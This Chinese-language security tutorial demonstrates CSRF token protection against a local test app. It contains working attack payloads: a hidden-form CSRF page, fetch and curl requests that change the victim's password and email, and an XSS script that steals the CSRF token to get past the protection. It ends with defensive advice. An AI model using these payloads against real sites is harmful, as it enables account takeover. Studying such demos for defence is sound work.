=== CSRF 保護機制演示 ===

## 🛡️ CSRF Token 保護機制測試

### 演示目的
展示有無 CSRF token 的差別：
- ✅ 有正確 CSRF token → 修改成功
- ❌ 沒有 CSRF token → 修改失敗
- ❌ 錯誤的 CSRF token → 修改失敗

## 📝 演示步驟

### Step 1: 正常情況 (有 CSRF Token)
1. 登入帳號: test/testpass
2. 進入帳號設定頁面: /account
3. 正常填寫表單修改密碼
4. ✅ 結果：修改成功

### Step 2: 沒有 CSRF Token 的攻擊測試

#### 方法 1: 瀏覽器控制台直接測試
```javascript
// 在瀏覽器開發者工具 Console 中執行
// 嘗試不帶 CSRF token 的請求
fetch('/account', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'new_password=hacked123&email=attacker@evil.com'
}).then(response => response.text())
  .then(data => console.log(data));

// 預期結果：CSRF token 驗證失敗
```

#### 方法 2: 外部惡意頁面攻擊
創建惡意 HTML 頁面 (可以放在桌面測試)：

```html
<!DOCTYPE html>
<html>
<head>
    <title>惡意攻擊頁面</title>
</head>
<body>
    <h1>🏴‍☠️ CSRF 攻擊測試頁面</h1>
    
    <!-- 隱藏的惡意表單 -->
    <form id="maliciousForm" action="http://127.0.0.1:5000/account" method="POST" style="display: none;">
        <input type="text" name="new_password" value="hacked123">
        <input type="text" name="email" value="attacker@evil.com">
        <!-- 故意不包含 CSRF token -->
    </form>
    
    <p>點擊下面的按鈕進行 CSRF 攻擊測試：</p>
    <button onclick="launchAttack()">🚀 發動 CSRF 攻擊</button>
    
    <div id="result"></div>
    
    <script>
    function launchAttack() {
        console.log('[ATTACK] 嘗試 CSRF 攻擊...');
        document.getElementById('result').innerHTML = '攻擊中...';
        
        // 使用 fetch API 進行攻擊
        fetch('http://127.0.0.1:5000/account', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: 'new_password=hacked123&email=attacker@evil.com',
            credentials: 'include'  // 包含 cookies
        })
        .then(response => response.text())
        .then(data => {
            if (data.includes('CSRF token 驗證失敗')) {
                document.getElementById('result').innerHTML = 
                    '<p style="color: green;">✅ CSRF 保護生效！攻擊被阻擋</p>';
            } else {
                document.getElementById('result').innerHTML = 
                    '<p style="color: red;">❌ CSRF 攻擊成功！密碼已被修改</p>';
            }
        })
        .catch(error => {
            document.getElementById('result').innerHTML = 
                '<p style="color: orange;">⚠️ 攻擊失敗：' + error + '</p>';
        });
    }
    </script>
</body>
</html>
```

#### 方法 3: 使用 curl 命令測試
```bash
# 在命令列中執行 (需要先獲得用戶的 session cookie)

# 1. 先登入獲得 session cookie
curl -c cookies.txt -X POST http://127.0.0.1:5000/login \
  -d "username=test&password=testpass"

# 2. 嘗試不帶 CSRF token 修改密碼
curl -b cookies.txt -X POST http://127.0.0.1:5000/account \
  -d "new_password=hacked123&email=attacker@evil.com"

# 預期結果：CSRF token 驗證失敗
```

### Step 3: 錯誤 CSRF Token 測試
```javascript
// 在瀏覽器控制台執行
fetch('/account', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    body: 'csrf_token=fake_token_123&new_password=hacked123&email=attacker@evil.com'
}).then(response => response.text())
  .then(data => console.log(data));

// 預期結果：CSRF token 驗證失敗
```

### Step 4: XSS 繞過 CSRF 保護
演示如何透過 XSS 獲取正確的 CSRF token：

```html
<script>
// 這個腳本展示 XSS 如何繞過 CSRF 保護
console.log('[XSS] 嘗試繞過 CSRF 保護...');

// 獲取頁面中的 CSRF token
const csrfToken = document.querySelector('input[name="csrf_token"]');

if (csrfToken) {
    console.log('[XSS] 找到 CSRF token:', csrfToken.value);
    
    // 使用正確的 CSRF token 進行攻擊
    fetch('/account', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `csrf_token=${csrfToken.value}&new_password=hacked123&email=attacker@evil.com`
    }).then(response => {
        if (response.ok) {
            console.log('[XSS] CSRF 保護被繞過！密碼修改成功');
            alert('XSS 攻擊成功！密碼已被修改為 hacked123');
        }
    });
} else {
    console.log('[XSS] 未找到 CSRF token');
}
</script>
```

## 🎯 演示重點說明

### CSRF 保護的有效性
- ✅ **防止外部攻擊**: 沒有 token 的外部請求會被拒絕
- ✅ **防止跨站攻擊**: 惡意網站無法獲得正確的 token
- ✅ **防止重放攻擊**: 每次都生成新的 token

### CSRF 保護的限制
- ❌ **無法防止 XSS**: 如果存在 XSS 漏洞，攻擊者可以獲得 token
- ❌ **同站攻擊**: 同一網站內的惡意腳本可以獲得 token
- ❌ **社會工程**: 用戶被誘騙執行包含 token 的請求

### 防護建議
1. **輸入驗證**: 防止 XSS 漏洞
2. **輸出編碼**: 對用戶輸入進行編碼
3. **SameSite Cookie**: 設置 Cookie 的 SameSite 屬性
4. **Content Security Policy**: 實施 CSP 防止腳本注入

## 📊 測試結果對比

| 攻擊方式 | 是否有 CSRF Token | 攻擊結果 | 防護狀態 |
|----------|-------------------|----------|----------|
| 外部惡意頁面 | ❌ 無 | 失敗 | ✅ 有效 |
| 直接 POST 請求 | ❌ 無 | 失敗 | ✅ 有效 |
| 錯誤 Token | ❌ 錯誤 | 失敗 | ✅ 有效 |
| XSS + CSRF | ✅ 正確 | 成功 | ❌ 無效 |
| 正常用戶操作 | ✅ 正確 | 成功 | ✅ 正常 |

這個演示清楚展示了 CSRF 保護機制的重要性以及 XSS 漏洞的危險性！
